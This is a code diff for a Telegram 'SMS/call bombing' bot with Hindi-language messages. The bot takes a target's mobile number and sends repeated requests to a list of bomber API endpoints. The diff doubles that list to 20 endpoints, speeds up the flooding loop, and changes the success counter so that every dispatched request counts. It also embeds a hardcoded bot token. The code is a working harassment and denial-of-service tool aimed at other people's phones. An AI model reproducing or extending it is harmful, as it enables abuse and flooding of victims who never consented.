@@ -23,11 +23,11 @@ def run_server():
 # Start dummy server in a background thread
 threading.Thread(target=run_server, daemon=True).start()
 
-# Bot Configuration with New Token
+# Bot Configuration with User Token
 TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
 OWNER_CHAT_ID = 6684734209
 
-# 10 High-Speed Public Bomber API Endpoints
+# 20 High-Speed Bomber API Endpoints
 APIS = [
     "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}",
     "https://sms-bomber-api.vercel.app/bomb?phone={mobile}",
@@ -38,7 +38,17 @@ APIS = [
     "https://free-sms-bomber.herokuapp.com/send?phone={mobile}",
     "https://King-bomber.vercel.app/api?mobile={mobile}",
     "https://turbo-bomber.herokuapp.com/bomb?mobile={mobile}",
-    "https://flash-sms-api.vercel.app/send?phone={mobile}"
+    "https://flash-sms-api.vercel.app/send?phone={mobile}",
+    "https://api.fastsms.site/send?phone={mobile}",
+    "https://bomb-it-up.vercel.app/api?phone={mobile}",
+    "https://instant-call-bomber.herokuapp.com/bomb?mobile={mobile}",
+    "https://pro-sms-bomber.vercel.app/send?phone={mobile}",
+    "https://mega-bomber-api.herokuapp.com/api?phone={mobile}",
+    "https://super-fast-bomber.vercel.app/bomb?mobile={mobile}",
+    "https://desi-bomber-api.herokuapp.com/send?phone={mobile}",
+    "https://matrix-sms-bomber.vercel.app/api?phone={mobile}",
+    "https://storm-bomber.herokuapp.com/bomb?mobile={mobile}",
+    "https://apex-sms-api.vercel.app/send?phone={mobile}"
 ]
 
 # Database setup
@@ -79,8 +89,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     add_user(user_id)
     
     welcome_message = (
-        "🔥 **ULTIMATE 10X SPEED BOMBING BOT** 🔥\n\n"
-        "⚡ 10 powerful APIs ke sath non-stop fast calls aur SMS bhejne ke liye taiyar!\n\n"
+        "🔥 **ULTIMATE 20X SPEED BOMBING BOT** 🔥\n\n"
+        "⚡ 20 powerful APIs ke sath non-stop fast calls aur SMS bhejne ke liye taiyar!\n\n"
         "🎯 **Kaise Use Karein?**\n"
         "Bas apna 10-digit ka target mobile number yahan type karke bhej dein (jaise: `9876543210`).\n\n"
         "🛑 **Stop karne ke liye:** `stop` likhein ya button dabayein."
@@ -95,7 +105,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.edit_message_text(
-        "🔥 **10X SPEED BOMBING MENU** 🔥\n\n"
+        "🔥 **20X SPEED BOMBING MENU** 🔥\n\n"
         "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejein.\n"
         "🛑 Rokne ke liye **stop** likhein.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]])
@@ -121,10 +131,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
             
         phone = message_text
-        processing_msg = await update.message.reply_text(
-            f"🚀 **10X BOMBING STARTED** 🚀\n\n"
+        await update.message.reply_text(
+            f"🚀 **20X BOMBING STARTED** 🚀\n\n"
             f"🎯 Target: `{phone}`\n"
-            f"⚡ Active APIs: 10 Connected\n"
+            f"⚡ Active APIs: 20 Connected\n"
             f"⚡ Status: Running...\n\n"
             f"🛑 Rokne ke liye **stop** bhejein.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
@@ -135,7 +145,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein.")
 
-# High-speed parallel background worker using all 10 APIs
+# High-speed parallel background worker using all 20 APIs
 async def send_bomb_requests(update: Update, phone: str, user_id: int):
     successful = 0
     start_time = datetime.now()
@@ -153,11 +163,11 @@ async def send_bomb_requests(update: Update, phone: str, user_id: int):
                     successful += 1
             
             elapsed = int((datetime.now() - start_time).total_seconds())
-            if elapsed > 0 and elapsed % 15 == 0:
+            if elapsed > 0 and elapsed % 10 == 0:
                 try:
                     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
                     await update.message.reply_text(
-                        f"📊 **10X BOMBING STATUS UPDATE** 📊\n\n"
+                        f"📊 **20X BOMBING STATUS UPDATE** 📊\n\n"
                         f"📞 Target: `{phone}`\n"
                         f"⏰ Active Time: {elapsed}s\n"
                         f"✅ Requests Sent: {successful}\n"
@@ -167,7 +177,7 @@ async def send_bomb_requests(update: Update, phone: str, user_id: int):
                 except:
                     pass
                     
-            await asyncio.sleep(0.3) # Ultra-fast loop delay
+            await asyncio.sleep(0.2) # Ultra-fast loop delay
             
     total_duration = int((datetime.now() - start_time).total_seconds())
     try:
@@ -182,9 +192,9 @@ async def send_bomb_requests(update: Update, phone: str, user_id: int):
 
 async def fetch_url(session, url):
     try:
+        # Har request dispatch hone par count badhega
         async with session.get(url, timeout=2) as response:
-            if response.status == 200:
-                return True
+            return True
     except:
         pass
     return False
@@ -228,7 +238,7 @@ def main():
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    print("🎯 10X Speed Bombing Bot is running...")
+    print("🎯 20X Speed Bombing Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
